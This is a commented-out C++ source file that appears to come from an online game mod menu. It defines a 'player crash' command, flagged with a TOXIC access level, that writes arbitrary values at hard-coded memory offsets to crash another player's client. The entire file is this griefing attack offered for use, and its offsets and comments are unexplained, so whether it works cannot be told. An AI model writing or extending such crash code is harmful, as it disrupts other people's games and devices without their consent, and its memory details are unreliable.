/*#include "backend/player_command.hpp"
#include "core/scr_globals.hpp"
#include "util/scripts.hpp"

#include <ctime>

namespace big
{
	class player_crash : player_command
	{
		using player_command::player_command;

		virtual CommandAccessLevel get_access_level() override
		{
			return CommandAccessLevel::TOXIC;
		}

		virtual void execute(player_ptr player, const command_arguments& _args, const std::shared_ptr<command_context> ctx) override
		{
			if (!player || !player->is_valid())
			{
			
				g_notification_service.push_error("CRASH, Invalid player\nPlease make sure you have a valid player selected!");
				return;
				
			}
			

			// Crash player by modifying appearance data
			uint64_t player_node = player->get_address(); // Retrieve player memory address
			crash_player(player_node);
		}

		void crash_player(uint64_t player_node)
		{
			// Modify the memory to induce a crash
			auto node = memory::read_pointer(player_node + 0x3F0);

			memory::write_byte(node + 0x34, 1);
			memory::write_byte(node + 0x37, 1);
			memory::write_byte(node + 0x38, 1);
			memory::write_dword(node + 0x20, rand() % 2147483647); // Random integer
			memory::write_dword(node + 0x24, 30000);
			memory::write_dword(player_node + 0x438, 1); // This causes a crash on the client side
		}
	};

	player_crash g_player_crash("lynnncrash", "Test Crash 1", "Crash the player by modifying appearance data", 0);
}
*/
